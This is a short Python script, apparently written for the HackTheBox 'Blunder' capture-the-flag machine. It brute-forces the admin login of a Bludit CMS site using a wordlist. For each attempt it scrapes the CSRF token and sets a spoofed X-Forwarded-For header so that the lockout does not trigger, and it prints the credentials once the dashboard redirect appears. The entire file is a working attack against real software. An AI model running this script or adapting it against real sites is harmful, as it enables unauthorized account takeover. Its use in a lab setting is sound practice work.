#!/bin/python3

import re
import requests

host = "http://10.10.10.191"

login_url = host + '/admin/login'
username = 'fergus'
fname = "/home/kali/ctf/CTFs/HackTheBox/Blunder/passwordlist.txt"

with open(fname) as f:
    content = f.readlines()
    hello = [x.strip() for x in content]
wordlist = hello

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
            'X-Forwarded-For': password,
            'User-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Referer': login_url
            }
    data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
            }

    login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)

    if 'location' in login_result.headers:
        if '/admin/dashbaord' in login_result.headers['location']:
            print()
            print("password found")
            print("{u}:{p}".format(u = username, p = password))
            print()
            break
